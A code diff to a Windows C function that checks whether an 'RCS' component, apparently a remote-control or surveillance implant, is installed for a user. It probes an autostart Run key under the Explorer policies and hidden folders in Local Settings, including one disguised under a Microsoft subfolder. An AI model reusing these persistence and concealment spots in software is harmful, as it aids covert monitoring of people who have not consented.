@@ -81,18 +81,24 @@ DWORD WIN_GetUserRCSStatus(users_struct_t *user_info, rcs_struct_t *rcs_info)
 		if (rcs_reg) {
 			SAFE_FREE(rcs_reg);
 			is_reg = TRUE;
+		} else {
+			ReadRegValue(L"RCS_NTUSER\\software\\microsoft\\windows\\currentversion\\policies\\explorer\\run", rcs_info->new_hreg, NULL, &rcs_reg);
+			if (rcs_reg) {
+				SAFE_FREE(rcs_reg);
+				is_reg = TRUE;
+			}
 		}
 	}
 
 	// Controlla se esiste la directory vecchia
-	swprintf_s(rcs_dir, sizeof(rcs_dir)/sizeof(rcs_dir[0]), L"%s%s\\%s", user_info->user_home, user_info->user_temp, rcs_info->hdir);	
+	swprintf_s(rcs_dir, sizeof(rcs_dir)/sizeof(rcs_dir[0]), L"%s%s\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->hdir);	
 	hfile = CreateFile(rcs_dir, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
 	if (hfile != INVALID_HANDLE_VALUE) {
 		CloseHandle(hfile);
 		is_dir = TRUE;
 	}
 	// Controlla se esiste la directory
-	swprintf_s(rcs_dir, sizeof(rcs_dir)/sizeof(rcs_dir[0]), L"%s%s\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->hdir);	
+	swprintf_s(rcs_dir, sizeof(rcs_dir)/sizeof(rcs_dir[0]), L"%s%s\\Microsoft\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->new_hdir);	
 	hfile = CreateFile(rcs_dir, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
 	if (hfile != INVALID_HANDLE_VALUE) {
 		CloseHandle(hfile);
